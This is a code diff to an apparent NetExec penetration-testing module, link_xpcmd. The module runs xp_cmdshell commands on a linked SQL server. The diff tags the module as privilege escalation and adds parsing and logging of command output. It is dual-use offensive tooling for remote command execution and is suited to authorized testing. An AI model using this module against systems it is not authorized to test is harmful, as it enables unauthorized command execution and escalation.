@@ -1,3 +1,6 @@
+from nxc.helpers.misc import CATEGORY
+
+
 class NXCModule:
     """
     Run xp_cmdshell commands on a linked SQL server
@@ -7,8 +10,7 @@ class NXCModule:
     name = "link_xpcmd"
     description = "Run xp_cmdshell commands on a linked SQL server"
     supported_protocols = ["mssql"]
-    opsec_safe = False
-    multiple_hosts = False
+    category = CATEGORY.PRIVILEGE_ESCALATION
 
     def __init__(self):
         self.linked_server = None
@@ -31,5 +33,21 @@ class NXCModule:
             return
 
         self.context.log.display(f"Running command on {self.linked_server}: {self.command}")
-        result = self.mssql_conn.sql_query(f"EXEC ('xp_cmdshell ''{self.command}''') AT [{self.linked_server}]")
-        self.context.log.success(f"Command output: {result}")
+        query = f"EXEC ('xp_cmdshell ''{self.command}''') AT [{self.linked_server}]"
+        result = self.mssql_conn.sql_query(query)
+
+        if result:
+            output_lines = []
+            for row in result:
+                output_value = row.get("output")
+                if output_value and output_value != "NULL":
+                    output_lines.append(str(output_value))
+
+            if output_lines:
+                self.context.log.success("Executed command via linked server")
+                for line in output_lines:
+                    self.context.log.highlight(line.strip())
+            else:
+                self.context.log.display("Command executed but returned no output")
+        else:
+            self.context.log.fail("No result returned from query")
